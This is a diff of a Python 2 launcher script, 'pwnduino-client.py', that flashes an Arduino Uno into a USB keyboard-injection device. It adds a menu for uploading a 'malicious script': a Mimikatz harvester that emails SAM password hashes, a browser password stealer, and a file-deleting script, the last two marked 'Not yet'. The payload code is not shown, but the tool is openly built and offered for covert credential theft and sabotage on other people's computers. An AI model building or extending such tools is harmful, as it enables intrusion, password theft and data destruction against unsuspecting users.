@@ -1,6 +1,8 @@
 ############## Python Modules ##############
-import os, sys, argparse, signal
+import os, sys, argparse, signal, warnings, serial, platform
+import serial.tools.list_ports
 from time import sleep
+
 ############## ############## ##############
 
 
@@ -22,15 +24,15 @@ LP = '\033[1;35m' # light purple
 LC = '\033[1;36m' # light cyan
 
 # FAIL and SUCCESS
-FAIL = "[" + R + "FAILED!" + W + "]"
-SUCCESS = "[" + G + "SUCCESS" + W + "]"
+MISSING = "[" + R + "MISSING!" + W + "]"
+FOUND = "[" + G + "FOUND" + W + "]"
 
 # Cowsay!
 header = LP + """
 
   ______________________________________
-| pwnduino-client.py - Turn your Arduino |
-| into a pwnDuino!                       |
+ |Hey there! Before you go on, I need to|
+ |see if you have an Arduino!           |
   --------------------------------------
          \   ^__^
           \  (oo)\_______
@@ -40,105 +42,157 @@ header = LP + """
 
 """ + W
 
+header1 = """
+
+                ..:::::::::..
+           ..:::aad8888888baa:::..
+        .::::d:?88888888888?::8b::::.
+      .:::d8888:?88888888??a888888b:::.
+    .:::d8888888a8888888aa8888888888b:::.
+   ::::dP::::::::88888888888::::::::Yb::::
+  ::::dP:::::::::Y888888888P:::::::::Yb::::
+ ::::d8:::::::::::Y8888888P:::::::::::8b::::
+.::::88::::::::::::Y88888P::::::::::::88::::.
+:::::Y8baaaaaaaaaa88P:T:Y88aaaaaaaaaad8P:::::
+:::::::Y88888888888P::|::Y88888888888P:::::::
+::::::::::::::::888:::|:::888::::::::::::::::
+`:::::::::::::::8888888888888b::::::::::::::'
+ :::::::::::::::88888888888888::::::::::::::
+  :::::::::::::d88888888888888:::::::::::::
+   ::::::::::::88::88::88:::88::::::::::::
+    `::::::::::88::88::88:::88::::::::::'
+      `::::::::88::88::P::::88::::::::'
+        `::::::88::88:::::::88::::::'
+           ``:::::::::::::::::::''
+                ``:::::::::''
+
+          ------------------------
+            Welcome to pwnduino!
+          Pick Your Poison WISELY!
+          ------------------------
+
+        Developed By: the pwnduino team
+        OS Version: {}
+        Thanks: @SamyKamkar @Screetsec !
+
+""".format(platform.platform())
+
 ############## ############## ##############
 
 
 ############## Interrupt Handler ##############
 def handler(signal, frame):
-    print R + "Interrupted! Stopping..." + W
-    os.system("rm -r src/dmesg.txt &>/dev/null")
-    sys.exit(1)
+    sys.exit(R + "\nInterrupted! Stopping..." + W)
 
 signal.signal(signal.SIGINT, handler)
 ############## ############## ##############
 
 
-############## Command-line Parser ##############
-parser = argparse.ArgumentParser(description='Turn Arduino into a pwnDuino')
-parser.add_argument('--check-deps', dest="dep", action="store_false", help="Check if dependencies are installed")
-args = parser.parse_args()
 
-dep = args.dep
+########################### Main Methods ###########################
 
-if dep is False:
-    print "Checking dependencies"
+def checkArduino():
+    print header
+
+    print LC + "Welcome to pwnduino! Please insert your Arduino Uno. Press Enter to continue" + W
     raw_input()
-else:
-    pass
-############## ############## ##############
 
 
-############## Actual Code ##############
-print header
 
-os.system("dmesg -c > /dev/null")
-
-print LC + "Welcome to pwnduino-client! Please plug in (or plug out and plug in again) your Arduino Uno. Press Enter to continue" + W
-enter = raw_input("")
-
-try:
-    os.system("dmesg > src/dmesg.txt")
-    print O + "Checking..." + W
-    sleep(3)
-    fileHandle = open ( 'src/dmesg.txt',"r" )
-    lineList = fileHandle.readlines()
-    fileHandle.close()
-except KeyboardInterrupt:
-    print R + "Interrupted! Killing..."
+    arduino_ports = [
+        p.device
+        for p in serial.tools.list_ports.comports()
+        if 'Arduino' in p.description
+    ]
+    if not arduino_ports:
+        sys.exit( LR + "[!] No Arduino Found! Exiting... [!]" + W )
+    if len(arduino_ports) > 1:
+        warnings.warn(LY + 'Multiple Arduinos found - using the first' + W)
 
 
-for x in range(-4, 0):
-    found = False
-    try:
-        print lineList[x]
-        found = True
-    except IndexError:
-        print O + "[!] Arduino not detected in dmesg [!]" + W
-        found = False
+    ser = serial.Serial(arduino_ports[0])
+    print G + "[*] Arduino Found! Entering Main Menu...[*]" + W
+    sleep(1.5)
 
 
-if found == True:
-    print LG +  "Arduino found!" + W
-elif found == False:
-    noduino = raw_input(R + "[!] There seems to be no Arduino detected. Would you like to continue? (y/n) [!] " + W)
-    if noduino == "y":
-        pass
-    elif noduino == "n":
-        sys.exit(1)
+
+def usbserial():
+    print O + "[*] On the Arduino, please short GND and ICSP header pin. Press Enter once completed [*]"
+    enter = raw_input()
+    print O + "[*] Performing Initial Flashing... [*]" + W
+    os.system("dfu-programmer atmega16u2 erase")
+    os.system("cd src && dfu-programmer atmega16u2 flash --debug 1 Arduino-usbserial.hex")
+    os.system("dfu-programmer atmega16u2 reset")
+    print LG + "[!] Done! Unplug your boring regular " + LB + "Arduino Uno" + LG + " and do some regular stuff  " + W
+    raw_input(C + "[Enter to Continue]" + W )
+    print ""
+
+def upload():
+    while True:
+        print ""
+        print "-------------------------------------------------"
+        print LP + "[1]" + W + " Mimikatz Cred Harvester (thanks Screetsec!)"
+        print "sends passwords from SAM to specified email"
+        print "-------------------------------------------------"
+        print LP + "[2]" + W + " WebbrowserPassView Cred Harvester"
+        print "steals web browser passwords and sends to specified email"
+        print "-------------------------------------------------"
+        print LP + "[3]" + W + " Scr1pt_k1dd13.exe"
+        print "a stupid script that deletes important system files"
+        print "-------------------------------------------------"
+
+        script = raw_input(LC + "[>] Which script? " + W )
+
+        if script == "1":
+            break
+        elif script == "2":
+            print LG + "Not yet..." + W
+            continue
+        elif script == "3":
+            print LR + "Not yet..." + W
+            continue
+
+def keyboardflash():
+    print LB + "Flashing Arduino into HID Keyboard Device..." + W
+    print LO + "[*] On the Arduino, please short GND and ICSP header pin. Press Enter once completed [*]" + W
+    enter = raw_input()
+    os.system("dfu-programmer atmega16u2 erase")
+    os.system("cd src/ && dfu-programmer atmega16u2 flash --debug 1 Arduino-keyboard.hex")
+    os.system("dfu-programmer atmega16u2 reset")
+    print LG + "[!] Done! Unplug your brand-new " + LB + "pwnduino" + LG + " and Hack the Gibson!" + W
+    raw_input(C + "[Enter to Continue]" + W )
+    print ""
+
+##########################################################################################################
+
+checkArduino()
+
+while True:
+    print header1 + LC
+    print "====================================="
+    print "1. Flash Arduino into Serial device"
+    print "2. Flash Arduino into HID"
+    print "3. Upload pwnduino malicious script"
+    print "4. Detect Arduino"
+    print "====================================="
+    print "" + B
+    print "====================================="
+    print "5. Complete Arduino Flash"
+    print "=====================================" + W
+
+    flash = raw_input(LG + "(>) Select Option: " + W )
+    if flash == "1":
+        usbserial()
+    elif flash == "2":
+        keyboardflash()
+    elif flash == "3":
+        upload()
+    elif flash == "4":
+        checkArduino()
+    elif flash == "5":
+        usbserial()
+        upload()
+        keyboardflash()
     else:
-        print "Oops! No input!"
-
-os.system("rm -r src/dmesg.txt")
-
-print O + "[*] On the Arduino, please short GND and reset. Press Enter once completed [*]"
-enter = raw_input()
-print O + "[*] Performing Initial Flashing... [*]" + W
-os.system("dfu-programmer atmega16u2 erase")
-os.system("cd src && dfu-programmer atmega16u2 flash --debug 1 Arduino-usbserial.hex")
-os.system("dfu-programmer atmega16u2 reset")
-print LG + "Done! Plug cycle the Arduino and press Enter once that is finished" + W
-enter = raw_input()
-
-
-print "==================================="
-print "|| (1) Windows 7/8/10            ||"
-print "|| (2) Mac OS X / Darwin         ||"
-print "|| (3) Unix/Linux-based Distros  ||"
-print "==================================="
-
-platform = raw_input(LC + "[>] What is the platform you are targeting? " + W )
-
-if platform == "1":
-    print  LG + "[*] Initial Windows 7/8/10 sketch build... [*]"
-    print LO + "Uploading sketch to Arduino..." + W
-    os.system("cd src/ && arduino --upload windows_hid.ino")
-elif platform == "2":
-    print LG + "Not yet..."
-
-print LB + "Flashing Arduino into HID Keyboard Device..." + W
-print LO + "[*] On the Arduino, please short GND and reset. Press Enter once completed [*]" + W
-enter = raw_input()
-os.system("dfu-programmer atmega16u2 erase")
-os.system("cd src/ && dfu-programmer atmega16u2 flash --debug 1 Arduino-keyboard.hex")
-os.system("dfu-programmer atmega16u2 reset")
-print LG + "[!] Done! Unplug your brand-new " + LB + "pwnduino" + LG + " and Hack the Gibson!" + W
+        print LR + "Did not get that!" + W
+        continue
